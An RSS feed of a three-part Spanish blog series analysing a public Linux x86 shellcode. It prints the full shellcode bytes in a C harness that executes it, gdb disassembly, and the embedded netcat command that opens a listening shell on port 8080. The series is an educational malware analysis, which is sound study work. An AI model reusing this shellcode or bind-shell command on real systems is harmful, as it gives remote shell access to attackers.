<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="../assets/xml/rss.xsl" media="all"?><rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/" version="2.0"><channel><title>deibit (seguridad)</title><link>http://deibit.com/</link><description></description><atom:link href="http://deibit.com/categories/seguridad.xml" rel="self" type="application/rss+xml"></atom:link><language>en</language><lastBuildDate>Thu, 21 Jul 2016 20:59:47 GMT</lastBuildDate><generator>https://getnikola.com/</generator><docs>http://blogs.law.harvard.edu/tech/rss</docs><item><title>Analizando un shellcode (III)</title><link>http://deibit.com/posts/2011/04/13/analizando-un-shellcode-iii/</link><dc:creator>David García</dc:creator><description>&lt;p&gt;Hasta ahora hemos visto como está estructurado el shellcode y como se produce la llamada al sistema. También hemos comentado como se produce un salto hacia el final (donde se encuentra “/bin/nc -lp8080 -e/bin/sh”) y vuelta hacia delante para obtener un pivote hacia la cadena.&lt;/p&gt;
&lt;p&gt;Vamos a ver como se ejecutan las instrucciones del shellcode para elaborar los argumentos que faltan y para pasarlos a la llamada al sistema. Recordemos que esta llamada al sistema precisa de 3 argumentos:&lt;/p&gt;
&lt;p&gt;[sourcecode language="cpp"]&lt;br&gt;
int execve(const char *filename, char *const argv[], char *const envp[]);&lt;br&gt;
[/sourcecode]&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Filename&lt;/strong&gt;: un nombre de archivo (un puntero a una cadena)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;argv&lt;/strong&gt;:        un puntero a un array de punteros a char (cadenas) que serán los argumentos a pasar al programa.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;envp&lt;/strong&gt;:       un puntero a un array de punteros a char (más cadenas) donde podemos pasar variables de entorno para el proceso a crear.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Y ahora dos preguntas:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;¿No deben los arrays de punteros a cadenas terminar con un ’0′ cada cadena?&lt;br&gt;
¿No deben no contener el carácter ’0′ los shellcodes?&lt;/p&gt;
&lt;p&gt;Esto es lo que hace el resto del código que aun no hemos comentado aun, modificar la cadena que ya está en memoria para ir creando los caracteres que faltan e ir posicionando las partes precisas para que luego las podamos meter en los registros que van a servir para la llamada la sistema.&lt;/p&gt;
&lt;p&gt;Y aquí también es donde entra la magia o arte del shellcoding: cuantas menos instrucciones más pequeño y cuanto más pequeño mejor.&lt;/p&gt;
&lt;p&gt;Bien, tenemos el código:&lt;/p&gt;
&lt;p&gt;[sourcecode]&lt;br&gt;
(gdb) x/30i shellcode&lt;br&gt;
   0x804a040 &amp;lt;shellcode&amp;gt;:	jmp    0x804a06c &amp;lt;shellcode+44&amp;gt;&lt;br&gt;
   0x804a042 &amp;lt;shellcode+2&amp;gt;:	pop    %esi&lt;br&gt;
   0x804a043 &amp;lt;shellcode+3&amp;gt;:	xor    %eax,%eax&lt;br&gt;
   0x804a045 &amp;lt;shellcode+5&amp;gt;:	mov    %al,0x7(%esi)&lt;br&gt;
   0x804a048 &amp;lt;shellcode+8&amp;gt;:	mov    %al,0xf(%esi)&lt;br&gt;
   0x804a04b &amp;lt;shellcode+11&amp;gt;:	mov    %al,0x19(%esi)&lt;br&gt;
   0x804a04e &amp;lt;shellcode+14&amp;gt;:	mov    %esi,0x1a(%esi)&lt;br&gt;
   0x804a051 &amp;lt;shellcode+17&amp;gt;:	lea    0x8(%esi),%ebx&lt;br&gt;
   0x804a054 &amp;lt;shellcode+20&amp;gt;:	mov    %ebx,0x1e(%esi)&lt;br&gt;
   0x804a057 &amp;lt;shellcode+23&amp;gt;:	lea    0x10(%esi),%ebx&lt;br&gt;
   0x804a05a &amp;lt;shellcode+26&amp;gt;:	mov    %ebx,0x22(%esi)&lt;br&gt;
   0x804a05d &amp;lt;shellcode+29&amp;gt;:	mov    %eax,0x26(%esi)&lt;br&gt;
   0x804a060 &amp;lt;shellcode+32&amp;gt;:	mov    $0xb,%al&lt;br&gt;
   0x804a062 &amp;lt;shellcode+34&amp;gt;:	mov    %esi,%ebx&lt;br&gt;
   0x804a064 &amp;lt;shellcode+36&amp;gt;:	lea    0x1a(%esi),%ecx&lt;br&gt;
   0x804a067 &amp;lt;shellcode+39&amp;gt;:	lea    0x26(%esi),%edx&lt;br&gt;
   0x804a06a &amp;lt;shellcode+42&amp;gt;:	int    $0x80&lt;br&gt;
   0x804a06c &amp;lt;shellcode+44&amp;gt;:	call   0x804a042 &amp;lt;shellcode+2&amp;gt;&lt;br&gt;
   0x804a071 &amp;lt;shellcode+49&amp;gt;:	das              &amp;lt;——————- COMIENZO DE CADENA&lt;br&gt;
   0x804a072 &amp;lt;shellcode+50&amp;gt;:	bound  %ebp,0x6e(%ecx)&lt;br&gt;
   0x804a075 &amp;lt;shellcode+53&amp;gt;:	das&lt;br&gt;
[/sourcecode]&lt;/p&gt;
&lt;p&gt;y tenemos la cadena:&lt;/p&gt;
&lt;p&gt;[sourcecode]&lt;br&gt;
00001070  ff 2f 62 69 6e 2f 6e 63  23 2d 6c 70 38 30 38 30  |./bin/nc#-lp8080|&lt;br&gt;
00001080  23 2d 65 2f 62 69 6e 2f  73 68 23 00 44 69 72 3a  |#-e/bin/sh#.Dir:|&lt;br&gt;
[/sourcecode]&lt;/p&gt;
&lt;p&gt;Esto último es la salida del comando hexdump, donde el carácter ‘/’ que en hexadecimal es ’2f’. La dirección de comienzo de la cadena será: 0x804a071. Esta dirección, lo volvemos a repetir, la conoce el shellcode al saltar hacia “call 0x804a042″, se produce la llamada y se carga en la pila la dirección de retorno que es exactamente donde empieza la cadena. Al ir a la dirección de la llamada lo primero que se hace es pop a ESI donde se carga esta dirección. Es en este registro donde tenemos el pivote hacia la cadena.&lt;/p&gt;
&lt;p&gt;La siguiente instrucción es un “xor %eax,%eax” que no es otra cosa que poner a ’0′ el registro EAX. Ya tenemos el cero que andábamos buscando.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Siguientes instrucciones:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;[sourcecode]&lt;br&gt;
   0x804a045 &amp;lt;shellcode+5&amp;gt;:	mov    %al,0x7(%esi)&lt;br&gt;
   0x804a048 &amp;lt;shellcode+8&amp;gt;:	mov    %al,0xf(%esi)&lt;br&gt;
   0x804a04b &amp;lt;shellcode+11&amp;gt;:	mov    %al,0x19(%esi)&lt;br&gt;
[/sourcecode]&lt;br&gt;
”&lt;br&gt;
AL es el último byte (el de menor peso) del registro EAX, que tiene el valor de ’00′. Este valor va a ser “copiado” a ESI + 0x7, ESI + 0xF y ESI + 19.&lt;/p&gt;
&lt;p&gt;Como ESI vale 0x804a071 podemos hacer nuestras cuentas:&lt;/p&gt;
&lt;p&gt;0x804a071 + 0x7  =  0x804a079&lt;br&gt;
0x804a071 + 0xF  =  0x804a080&lt;br&gt;
0x804a071 + 0x19 = 0x804a08A&lt;/p&gt;
&lt;p&gt;Direcciones que se corresponden con las letras de la cadena: primer ‘#’, segundo ‘#’ y tercer ‘#’. Prácticamente un reemplazo de los caracteres ‘#’ por ’0′.&lt;/p&gt;
&lt;p&gt;La cadena queda partida en 3 subcadenas: &lt;/p&gt;
&lt;p&gt;/bin/nc   -lp8080   -e/bin/sh&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Siguiente grupo:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;[sourcecode]&lt;br&gt;
   0x804a04e &amp;lt;shellcode+14&amp;gt;:	mov    %esi,0x1a(%esi)&lt;br&gt;
   0x804a051 &amp;lt;shellcode+17&amp;gt;:	lea    0x8(%esi),%ebx&lt;br&gt;
   0x804a054 &amp;lt;shellcode+20&amp;gt;:	mov    %ebx,0x1e(%esi)&lt;br&gt;
   0x804a057 &amp;lt;shellcode+23&amp;gt;:	lea    0x10(%esi),%ebx&lt;br&gt;
   0x804a05a &amp;lt;shellcode+26&amp;gt;:	mov    %ebx,0x22(%esi)&lt;br&gt;
   0x804a05d &amp;lt;shellcode+29&amp;gt;:	mov    %eax,0x26(%esi)&lt;br&gt;
[/sourcecode]&lt;/p&gt;
&lt;p&gt;Instrucción por instrucción:&lt;/p&gt;
&lt;p&gt;1.- Mueve el valor de ESI (dirección de comienzo de la cadena) al final de la cadena ESI+0x1A. Ojo, aquí tenemos una dirección que apunta a la primera subcadena: “/bin/nc”&lt;br&gt;
2.- Carga en EBX el valor de la dirección efectiva (Load Effective Address) de ESI+0x8. Que es donde comienza la siguiente subcadena: “-lp8080″ ¿No es un buen lugar para comenzar un array de cadenas?&lt;br&gt;
3.- Mueve a ESI+0x22 el valor de EBX. Ya tenemos al final de la cadena la dirección de la primera subcadena seguido de la dirección de la segunda.&lt;br&gt;
4.- Carga en EBX el valor de la dirección efectiva de ESI + 0x10. Esto nos deja en EBX la dirección 0x804a081 que es la subcadena “-e/bin/sh”&lt;br&gt;
5.- Mueve el valor que hay en EBX (la dirección de la ultima subcadena) a ESI+0x22. Ya tenemos al final de la cadena las 3 direcciones de las subcadenas.&lt;br&gt;
6.- Mueve EAX que vale 0x00000000 a ESI+0x26&lt;/p&gt;
&lt;p&gt;Al final terminamos con este layout al final de la cadena original del shellcode:&lt;/p&gt;
&lt;p&gt;FINAL DE LA CADENA | DIRECCIÓN PRIMERA SUBCADENA | DIRECCIÓN SEGUNDA SUBCADENA | DIRECCIÓN ULTIMA SUBCADENA | 0x00000000&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Cargamos parámetros para la llamada al sistema&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;[sourcecode]&lt;br&gt;
   0x804a060 &amp;lt;shellcode+32&amp;gt;:	mov    $0xb,%al&lt;br&gt;
   0x804a062 &amp;lt;shellcode+34&amp;gt;:	mov    %esi,%ebx&lt;br&gt;
   0x804a064 &amp;lt;shellcode+36&amp;gt;:	lea    0x1a(%esi),%ecx&lt;br&gt;
   0x804a067 &amp;lt;shellcode+39&amp;gt;:	lea    0x26(%esi),%edx&lt;br&gt;
   0x804a06a &amp;lt;shellcode+42&amp;gt;:	int    $0x80&lt;br&gt;
[/sourcecode]&lt;/p&gt;
&lt;p&gt;1.- En AL cargamos el valor 0xb que es 11 y que es el código de la llamada al sistema de “&lt;a href="http://linux.die.net/man/2/execve"&gt;execv&lt;/a&gt;”&lt;br&gt;
2.- Cargamos ESI en EBX para el primer parámetro que es el archivo a ejecutar. En este caso “/bin/nc” la herramienta NetCat.&lt;br&gt;
3.- Cargamos en ECX para el segundo parámetro el puntero a la siguiente subcadena que hará de puntero a array de cadenas y que contendrá los parámetros a pasar a NetCat que nos son otros que “-lp8080″ y “-e/bin/sh”.&lt;br&gt;
4.- Cargamos en EDX, el tercer parámetro para la llamada al sistema, el valor apuntado por ESI+0x26 que es como recordamos 0x00000000 o lo que es lo mismo, le estamos pasando un puntero nulo para decirle que no vamos a usar ese parámetro.&lt;br&gt;
5.- INT $0x80, sobran explicaciones: Si todo a ido bien esta interrupción le dice al núcleo que ejecute nuestra llamada y por lo tanto se cree un proceso que abrirá una shell a la escucha en el puerto 8080 de la máquina remota.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Tengo una bonita demostración para este shellcode pero no me queda espacio en este post. Lo dejo para otro.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Entradas anteriores&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="http://prisonernumbersix.com/2011/01/19/analizando-un-shellcode-i/"&gt;Analizando un shellcode I&lt;/a&gt;&lt;br&gt;
&lt;a href="http://prisonernumbersix.com/2011/02/12/analizando-un-shellcode-ii/"&gt;Analizando un shellcode II&lt;/a&gt;&lt;/p&gt;
</description><category>exploiting</category><category>linux</category><category>seguridad</category><category>shellcoding</category><guid>http://deibit.com/posts/2011/04/13/analizando-un-shellcode-iii/</guid><pubDate>Wed, 13 Apr 2011 19:02:44 GMT</pubDate></item><item><title>Analizando un shellcode (II)</title><link>http://deibit.com/posts/2011/02/12/analizando-un-shellcode-ii/</link><dc:creator>David García</dc:creator><description>&lt;p&gt;Tenemos el desemsamblado del programa (shellcode.c), vamos a ir viendo paso a paso la ejecución:&lt;/p&gt;
&lt;p&gt;En gris se encuentra resaltada la parte donde se encuentra la cadena “./bin/nc -lp8080 -e /bin/sh”&lt;/p&gt;
&lt;p&gt;[sourcecode highlight="20,21,22,23,24,25,26,27"]&lt;br&gt;
(gdb) x/38i shellcode&lt;br&gt;
   0x804a040 &amp;lt;shellcode&amp;gt;:	jmp    0x804a06c &amp;lt;shellcode+44&amp;gt;&lt;br&gt;
   0x804a042 &amp;lt;shellcode+2&amp;gt;:	pop    %esi&lt;br&gt;
   0x804a043 &amp;lt;shellcode+3&amp;gt;:	xor    %eax,%eax&lt;br&gt;
   0x804a045 &amp;lt;shellcode+5&amp;gt;:	mov    %al,0x7(%esi)&lt;br&gt;
   0x804a048 &amp;lt;shellcode+8&amp;gt;:	mov    %al,0xf(%esi)&lt;br&gt;
   0x804a04b &amp;lt;shellcode+11&amp;gt;:	mov    %al,0x19(%esi)&lt;br&gt;
   0x804a04e &amp;lt;shellcode+14&amp;gt;:	mov    %esi,0x1a(%esi)&lt;br&gt;
   0x804a051 &amp;lt;shellcode+17&amp;gt;:	lea    0x8(%esi),%ebx&lt;br&gt;
   0x804a054 &amp;lt;shellcode+20&amp;gt;:	mov    %ebx,0x1e(%esi)&lt;br&gt;
   0x804a057 &amp;lt;shellcode+23&amp;gt;:	lea    0x10(%esi),%ebx&lt;br&gt;
   0x804a05a &amp;lt;shellcode+26&amp;gt;:	mov    %ebx,0x22(%esi)&lt;br&gt;
   0x804a05d &amp;lt;shellcode+29&amp;gt;:	mov    %eax,0x26(%esi)&lt;br&gt;
   0x804a060 &amp;lt;shellcode+32&amp;gt;:	mov    $0xb,%al&lt;br&gt;
   0x804a062 &amp;lt;shellcode+34&amp;gt;:	mov    %esi,%ebx&lt;br&gt;
   0x804a064 &amp;lt;shellcode+36&amp;gt;:	lea    0x1a(%esi),%ecx&lt;br&gt;
   0x804a067 &amp;lt;shellcode+39&amp;gt;:	lea    0x26(%esi),%edx&lt;br&gt;
   0x804a06a &amp;lt;shellcode+42&amp;gt;:	int    $0x80&lt;br&gt;
   0x804a06c &amp;lt;shellcode+44&amp;gt;:	call   0x804a042 &amp;lt;shellcode+2&amp;gt;&lt;br&gt;
   0x804a071 &amp;lt;shellcode+49&amp;gt;:	das&lt;br&gt;
   0x804a072 &amp;lt;shellcode+50&amp;gt;:	bound  %ebp,0x6e(%ecx)&lt;br&gt;
   0x804a075 &amp;lt;shellcode+53&amp;gt;:	das&lt;br&gt;
   0x804a076 &amp;lt;shellcode+54&amp;gt;:	outsb  %ds:(%esi),(%dx)&lt;br&gt;
   0x804a077 &amp;lt;shellcode+55&amp;gt;:	arpl   %sp,(%ebx)&lt;br&gt;
   0x804a079 &amp;lt;shellcode+57&amp;gt;:	sub    $0x3038706c,%eax&lt;br&gt;
   0x804a07e &amp;lt;shellcode+62&amp;gt;:	cmp    %dh,(%eax)&lt;br&gt;
   0x804a080 &amp;lt;shellcode+64&amp;gt;:	and    0x69622f65,%ebp&lt;br&gt;
   0x804a086 &amp;lt;shellcode+70&amp;gt;:	outsb  %ds:(%esi),(%dx)&lt;br&gt;
   0x804a087 &amp;lt;shellcode+71&amp;gt;:	das&lt;br&gt;
   0x804a088 &amp;lt;shellcode+72&amp;gt;:	jae    0x804a0f2&lt;br&gt;
   0x804a08a &amp;lt;shellcode+74&amp;gt;:	and    (%eax),%eax&lt;br&gt;
[/sourcecode]&lt;/p&gt;
&lt;p&gt;Una vez que se consigue explotar una vulnerabilidad y desviar el flujo de ejecución del programa hacia nuestro shellcode la primera instrucción es un salto:&lt;/p&gt;
&lt;p&gt;0x804a040 :   jmp    0x804a06c &lt;/p&gt;
&lt;p&gt;que lleva a una llamada:&lt;/p&gt;
&lt;p&gt;0x804a06c :     call   0x804a042 &lt;/p&gt;
&lt;p&gt;que vuelve a posicionarnos justo debajo del salto:&lt;/p&gt;
&lt;p&gt; 0x804a042 :	pop    %esi&lt;/p&gt;
&lt;p&gt;¿Curioso no? ¿Para que tanto ir y volver si acabamos justo debajo de donde empezamos?&lt;/p&gt;
&lt;p&gt;Principalmente por dos razones:&lt;/p&gt;
&lt;p&gt;1.- Evitar bytes nulos ’0x00′. Esto se hace al efectuar el salto ‘jmp’. Si hubiésemos usado un call añadiríamos bytes nulos.&lt;br&gt;
2.- Necesitamos una referencia. Una dirección sobre la que pivotar. &lt;/p&gt;
&lt;p&gt;Respecto del primer punto es obvio y ya se comentó antes. El segundo tiene su explicación.&lt;/p&gt;
&lt;p&gt;Nuestro shellcode debe ser independiente de la posición donde se encuentre el código. Recordemos que nuestro código se va a ejecutar en la pila y que las direcciones de la pila cambiarán en cada ejecución debido al carácter dinámico de esta. &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;¿Como obtener ese punto de referencia?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Al efectuar una llamada ‘call   0x804a042 ‘ se va a dejar en la pila la dirección de retorno para que cuando se vuelva de la llamada el flujo de ejecución prosiga. Ahora bien, si observamos…¿Que hay debajo de la llamada? &lt;/p&gt;
&lt;p&gt;[sourcecode]&lt;br&gt;
   0x804a06c &amp;lt;shellcode+44&amp;gt;:	call   0x804a042 &amp;lt;shellcode+2&amp;gt;&lt;br&gt;
   0x804a071 &amp;lt;shellcode+49&amp;gt;:	das&lt;br&gt;
   0x804a072 &amp;lt;shellcode+50&amp;gt;:	bound  %ebp,0x6e(%ecx)&lt;br&gt;
   0x804a075 &amp;lt;shellcode+53&amp;gt;:	das&lt;br&gt;
   0x804a076 &amp;lt;shellcode+54&amp;gt;:	outsb  %ds:(%esi),(%dx)&lt;br&gt;
[/sourcecode]&lt;/p&gt;
&lt;p&gt;La cadena “./bin/nc -lp8080 -e /bin/sh”.&lt;/p&gt;
&lt;p&gt;Por lo tanto ya tenemos en la pila, en una posición conocida, la dirección de la cadena para usarla como parámetro para la llamada al sistema.&lt;/p&gt;
&lt;p&gt;Ese pop que vimos:&lt;/p&gt;
&lt;p&gt; 0x804a042 :	pop    %esi&lt;/p&gt;
&lt;p&gt;Va a almacenar la dirección de retorno que se a “pusheado” en la pila al efectuar la llamada en el registro “esi”.&lt;/p&gt;
&lt;p&gt;Vemos la secuencia con más detenimiento:&lt;/p&gt;
&lt;p&gt;Saltamos:&lt;br&gt;
0x804a040 :	jmp    0x804a06c &lt;/p&gt;
&lt;p&gt;Creamos la llamada, depositando la dirección de retorno en la pila:&lt;br&gt;
0x804a06c :     call   0x804a042 &lt;/p&gt;
&lt;p&gt;Y sacamos de la pila esa dirección almacenándola en “esi”:&lt;br&gt;
0x804a042 :	pop    %esi&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;La llamada al sistema &lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;La finalidad última del shellcode estudiado es llamar al programa ‘netcat’ abriendo el puerto 8080 para poner en él a la escucha una shell.&lt;/p&gt;
&lt;p&gt;Esto lo hace a través de una syscall. Una llamada al sistema. &lt;/p&gt;
&lt;p&gt;En el código podemos situarla aquí:&lt;/p&gt;
&lt;p&gt;[sourcecode]&lt;br&gt;
   0x804a060 &amp;lt;shellcode+32&amp;gt;:	mov    $0xb,%al&lt;br&gt;
   0x804a062 &amp;lt;shellcode+34&amp;gt;:	mov    %esi,%ebx&lt;br&gt;
   0x804a064 &amp;lt;shellcode+36&amp;gt;:	lea    0x1a(%esi),%ecx&lt;br&gt;
   0x804a067 &amp;lt;shellcode+39&amp;gt;:	lea    0x26(%esi),%edx&lt;br&gt;
   0x804a06a &amp;lt;shellcode+42&amp;gt;:	int    $0x80&lt;br&gt;
[/sourcecode]&lt;/p&gt;
&lt;p&gt;Se cargan los parámetros en los registros eax, ebx, ecx y edx. Y se llama a la interrupción 0x80. Esta interrupción le indica al kernel que queremos efectuar una llamada al sistema. &lt;/p&gt;
&lt;p&gt;Exactamente qué llamada va a ir indicada en el registro eax. Y va a ir designada por un número definido por una constante en un fichero:&lt;/p&gt;
&lt;p&gt;(el fichero es unistd.h, pero en Ubuntu para 32 bits, por ejemplo, la veremos en la ruta indicada abajo)&lt;/p&gt;
&lt;p&gt;$ cat /usr/include/asm/unistd_32.h &lt;/p&gt;
&lt;p&gt;[sourcecode language="cpp" highlight="19"]&lt;br&gt;
#ifndef _ASM_X86_UNISTD_32_H&lt;br&gt;
#define _ASM_X86_UNISTD_32_H&lt;/p&gt;
&lt;p&gt;/*&lt;br&gt;
 * This file contains the system call numbers.&lt;br&gt;
 */&lt;/p&gt;
&lt;p&gt;#define __NR_restart_syscall      0&lt;br&gt;
#define __NR_exit		  1&lt;br&gt;
#define __NR_fork		  2&lt;br&gt;
#define __NR_read		  3&lt;br&gt;
#define __NR_write		  4&lt;br&gt;
#define __NR_open		  5&lt;br&gt;
#define __NR_close		  6&lt;br&gt;
#define __NR_waitpid		  7&lt;br&gt;
#define __NR_creat		  8&lt;br&gt;
#define __NR_link		  9&lt;br&gt;
#define __NR_unlink		 10&lt;br&gt;
#define __NR_execve		 11&lt;br&gt;
#define __NR_chdir		 12&lt;br&gt;
#define __NR_time		 13&lt;br&gt;
#define __NR_mknod		 14&lt;br&gt;
#define __NR_chmod		 15&lt;br&gt;
#define __NR_lchown		 16&lt;br&gt;
#define __NR_break		 17&lt;br&gt;
…&lt;br&gt;
[/sourcecode]&lt;/p&gt;
&lt;p&gt;Si observamos lo que estamos cargando en eax:&lt;/p&gt;
&lt;p&gt;  0x804a060 :	mov    $0xb,%al&lt;/p&gt;
&lt;p&gt;En decimal ’0xb’ es ’11′ lo que correspondería a:&lt;/p&gt;
&lt;p&gt;#define __NR_execve		 11&lt;/p&gt;
&lt;p&gt;la llamada al sistema execve. &lt;/p&gt;
&lt;p&gt;Si miramos su página man:&lt;/p&gt;
&lt;p&gt;[sourcecode]&lt;br&gt;
EXECVE(2)                                          Linux Programmer’s Manual                                         EXECVE(2)&lt;/p&gt;
&lt;p&gt;NAME&lt;br&gt;
       execve – execute program&lt;/p&gt;
&lt;p&gt;SYNOPSIS&lt;br&gt;
       #include &amp;lt;unistd.h&amp;gt;&lt;/p&gt;
&lt;p&gt;       int execve(const char *filename, char *const argv[],&lt;br&gt;
                  char *const envp[]);&lt;/p&gt;
&lt;p&gt;DESCRIPTION&lt;br&gt;
       execve()  executes the program pointed to by filename.  filename must be either a binary executable, or a script start‐&lt;br&gt;
       ing with a line of the form:&lt;br&gt;
[/sourcecode]&lt;/p&gt;
&lt;p&gt;Vemos que necesita 3 parámetros: filename, argv y envp. Respectivamente, el nombre del programa, un array con los parámetros para ese programa y un array con las variables de entorno para ese programa que queramos fijar. &lt;/p&gt;
&lt;p&gt;Estos parámetros van a ir en los otros registros que hemos visto: ebx, ecx y edx.&lt;/p&gt;
&lt;p&gt;Más en la siguiente entrega.&lt;/p&gt;
</description><category>Basic</category><category>exploit</category><category>exploiting</category><category>gdb</category><category>seguridad</category><category>shellcode</category><guid>http://deibit.com/posts/2011/02/12/analizando-un-shellcode-ii/</guid><pubDate>Sat, 12 Feb 2011 09:45:22 GMT</pubDate></item><item><title>Analizando un shellcode (I)</title><link>http://deibit.com/posts/2011/01/19/analizando-un-shellcode-i/</link><dc:creator>David García</dc:creator><description>&lt;p&gt;Cogemos un shellcode que nos interesa y queremos saber como funciona por si hace cosas “raras”.&lt;/p&gt;
&lt;p&gt;El objeto de estudio será este &lt;a href="http://www.exploit-db.com/exploits/14332/"&gt;shellcode&lt;/a&gt; publicado en &lt;a href="http://www.exploit-db.com/"&gt;exploit-db&lt;/a&gt;. La elección ha sido puramente aleatoria, lo único que fuese para Linux, 32 bits y arquitectura Intel.&lt;/p&gt;
&lt;p&gt;Vemos el código en C:&lt;/p&gt;
&lt;p&gt;[sourcecode language="cpp" highlight="1,2,3,4"]&lt;br&gt;
char shellcode[] =&lt;br&gt;
"\xeb\x2a\x5e\x31\xc0\x88\x46\x07\x88\x46\x0f\x88\x46\x19\x89\x76\x1a\x8d\x5e\x08\x89\x5e\x1e\x8d\x5e\x10\x89\x5e\&lt;br&gt;
x22\x89\x46\x26\xb0\x0b\x89\xf3\x8d\x4e\x1a\x8d\x56\x26\xcd\x80\xe8\xd1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x6e\x63\x23\x2d&lt;br&gt;
\x6c\x70\x38\x30\x38\x30\x23\x2d\x65\x2f\x62\x69\x6e\x2f\x73\x68\x23";&lt;/p&gt;
&lt;p&gt;int main()&lt;br&gt;
{&lt;br&gt;
    int *ret;&lt;br&gt;
    ret = (int *)&amp;amp;ret + 2;&lt;br&gt;
    (*ret) = (int)shellcode;&lt;br&gt;
}&lt;br&gt;
[/sourcecode]&lt;/p&gt;
&lt;p&gt;Compilamos con información de debug:&lt;/p&gt;
&lt;p&gt;$ gcc -g shellcode.c -o shellcode&lt;/p&gt;
&lt;p&gt;Tendremos el símbolo shellcode en la sección ‘.data’ donde están las variables globales inicializadas.&lt;/p&gt;
&lt;p&gt;$ nm shellcode&lt;/p&gt;
&lt;p&gt;Arrancamos GDB y examinamos la parte que corresponde al símbolo ‘shellcode’:&lt;/p&gt;
&lt;p&gt;$ gdb shellcode&lt;br&gt;
(gdb) x/30i shellcode&lt;/p&gt;
&lt;p&gt;[sourcecode highlight="36"]&lt;br&gt;
(gdb) x/30i shellcode&lt;br&gt;
   0x804a040 &amp;lt;shellcode&amp;gt;:	jmp    0x804a06c &amp;lt;shellcode+44&amp;gt;&lt;br&gt;
   0x804a042 &amp;lt;shellcode+2&amp;gt;:	pop    %esi&lt;br&gt;
   0x804a043 &amp;lt;shellcode+3&amp;gt;:	xor    %eax,%eax&lt;br&gt;
   0x804a045 &amp;lt;shellcode+5&amp;gt;:	mov    %al,0x7(%esi)&lt;br&gt;
   0x804a048 &amp;lt;shellcode+8&amp;gt;:	mov    %al,0xf(%esi)&lt;br&gt;
   0x804a04b &amp;lt;shellcode+11&amp;gt;:	mov    %al,0x19(%esi)&lt;br&gt;
   0x804a04e &amp;lt;shellcode+14&amp;gt;:	mov    %esi,0x1a(%esi)&lt;br&gt;
   0x804a051 &amp;lt;shellcode+17&amp;gt;:	lea    0x8(%esi),%ebx&lt;br&gt;
   0x804a054 &amp;lt;shellcode+20&amp;gt;:	mov    %ebx,0x1e(%esi)&lt;br&gt;
   0x804a057 &amp;lt;shellcode+23&amp;gt;:	lea    0x10(%esi),%ebx&lt;br&gt;
   0x804a05a &amp;lt;shellcode+26&amp;gt;:	mov    %ebx,0x22(%esi)&lt;br&gt;
   0x804a05d &amp;lt;shellcode+29&amp;gt;:	mov    %eax,0x26(%esi)&lt;br&gt;
   0x804a060 &amp;lt;shellcode+32&amp;gt;:	mov    $0xb,%al&lt;br&gt;
   0x804a062 &amp;lt;shellcode+34&amp;gt;:	mov    %esi,%ebx&lt;br&gt;
   0x804a064 &amp;lt;shellcode+36&amp;gt;:	lea    0x1a(%esi),%ecx&lt;br&gt;
   0x804a067 &amp;lt;shellcode+39&amp;gt;:	lea    0x26(%esi),%edx&lt;br&gt;
   0x804a06a &amp;lt;shellcode+42&amp;gt;:	int    $0x80&lt;br&gt;
   0x804a06c &amp;lt;shellcode+44&amp;gt;:	call   0x804a042 &amp;lt;shellcode+2&amp;gt;&lt;br&gt;
   0x804a071 &amp;lt;shellcode+49&amp;gt;:	das&lt;br&gt;
   0x804a072 &amp;lt;shellcode+50&amp;gt;:	bound  %ebp,0x6e(%ecx)&lt;br&gt;
   0x804a075 &amp;lt;shellcode+53&amp;gt;:	das&lt;br&gt;
   0x804a076 &amp;lt;shellcode+54&amp;gt;:	outsb  %ds:(%esi),(%dx)&lt;br&gt;
   0x804a077 &amp;lt;shellcode+55&amp;gt;:	arpl   %sp,(%ebx)&lt;br&gt;
   0x804a079 &amp;lt;shellcode+57&amp;gt;:	sub    $0x3038706c,%eax&lt;br&gt;
   0x804a07e &amp;lt;shellcode+62&amp;gt;:	cmp    %dh,(%eax)&lt;br&gt;
   0x804a080 &amp;lt;shellcode+64&amp;gt;:	and    0x69622f65,%ebp&lt;br&gt;
   0x804a086 &amp;lt;shellcode+70&amp;gt;:	outsb  %ds:(%esi),(%dx)&lt;br&gt;
   0x804a087 &amp;lt;shellcode+71&amp;gt;:	das&lt;br&gt;
   0x804a088 &amp;lt;shellcode+72&amp;gt;:	jae    0x804a0f2&lt;br&gt;
   0x804a08a &amp;lt;shellcode+74&amp;gt;:	and    (%eax),%eax&lt;br&gt;
[/sourcecode]&lt;/p&gt;
&lt;p&gt;Si vemos la cadena hexadecimal del shellcode (en el código fuente) notaremos que entre los bytes no se encuentra ningún ’0x00′.&lt;/p&gt;
&lt;p&gt;Esto es básico a la hora de diseñar un shellcode: No debe contener el caracter NULL.&lt;/p&gt;
&lt;p&gt;La explicación es sencilla. Imaginemos que la vulnerabilidad a explotar reside en una función que copia una cadena procedente de una entrada (por red, directamente del usuario, un archivo…) hacia un buffer. Si no comprueba el tamaño podría exceder de la memoria reservada y sobreescribir donde no debe o donde no puede. Un error de manual.&lt;/p&gt;
&lt;p&gt;Si la función usa ‘strcpy’ y nuestro shellcode contiene un byte NULL, al ser interpretado es el equivalente a decirle a ‘strcpy’ que el final de la cadena ha llegado con lo cual nuestro shellcode no funcionará. Algo similar a como funciona el ataque de &lt;a href="http://insecure.org/news/P55-07.txt"&gt;“Null Byte Poison&lt;/a&gt;” solo que en este último nos aprovechamos justamente de eso.&lt;/p&gt;
